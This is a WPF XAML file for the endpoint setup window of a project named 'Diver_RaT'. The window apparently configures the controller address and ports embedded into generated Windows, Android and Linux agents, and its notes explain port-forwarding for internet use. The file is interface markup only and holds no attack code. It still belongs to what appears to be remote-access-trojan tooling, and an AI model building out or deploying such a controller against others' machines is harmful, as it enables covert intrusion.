<Window x:Class="Diver_RaT.EndpointSetupWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        Title="Controller Endpoint" Width="560" SizeToContent="Height"
        WindowStartupLocation="CenterScreen" ResizeMode="NoResize"
        WindowStyle="None"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Window.Resources>
        <Style x:Key="FieldLabel" TargetType="TextBlock">
            <Setter Property="FontSize" Value="12"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Foreground" Value="#A6ACBF"/>
            <Setter Property="Margin" Value="0,0,0,5"/>
        </Style>
        <Style x:Key="NoteText" TargetType="TextBlock">
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="Foreground" Value="{StaticResource MutedBrush}"/>
            <Setter Property="TextWrapping" Value="Wrap"/>
        </Style>
    </Window.Resources>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>

        <ui:CustomTitleBar Grid.Row="0" Title="Controller Endpoint Setup"/>

        <StackPanel Grid.Row="1" Margin="28,20,28,24">
            <Border Background="#1FB4FF00" BorderBrush="#55B4FF00" BorderThickness="1"
                    CornerRadius="8" Padding="14,10">
                <TextBlock Text="CONFIGURE CONTROLLER ENDPOINT" FontSize="15" FontWeight="Bold"
                           Foreground="#D6FF7A"/>
            </Border>

            <TextBlock Style="{StaticResource NoteText}" Margin="0,12,0,14">
                Set the IP / hostname and base port the entire system uses. This is applied to
                every listener and embedded into all generated agents.
            </TextBlock>

            <TextBlock Text="Controller IP / hostname" Style="{StaticResource FieldLabel}"/>
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="10"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <TextBox x:Name="IpTextBox" Grid.Column="0" Height="40"/>
                <Button x:Name="LocalIpButton" Grid.Column="2" Content="Use local IP" Width="110" Height="40"
                        Click="LocalIpButton_Click"/>
            </Grid>

            <TextBlock Text="Base TCP port" Style="{StaticResource FieldLabel}" Margin="0,14,0,5"/>
            <TextBox x:Name="PortTextBox" Height="40" Width="160" HorizontalAlignment="Left"/>

            <TextBlock x:Name="ErrorNote" FontSize="12" Foreground="#FF8A93" Margin="0,8,0,0"
                       TextWrapping="Wrap" Visibility="Collapsed"/>

            <TextBlock Style="{StaticResource NoteText}" Margin="0,12,0,0">
                Windows agents connect to this port, Android agents to port + 1, and Linux agents to port + 2.
                For internet use, set your public IP (or DDNS hostname) and port-forward this port (plus +1/+2)
                on your router to this controller.
            </TextBlock>

            <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,20,0,0">
                <Button x:Name="SkipButton" Content="Skip" Width="90" Height="32" Margin="0,0,8,0"
                        Style="{StaticResource DangerButtonStyle}" Click="SkipButton_Click" IsCancel="True"/>
                <Button x:Name="ContinueButton" Content="Continue" Width="120" Height="32"
                        Click="ContinueButton_Click" IsDefault="True"/>
            </StackPanel>
        </StackPanel>

        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>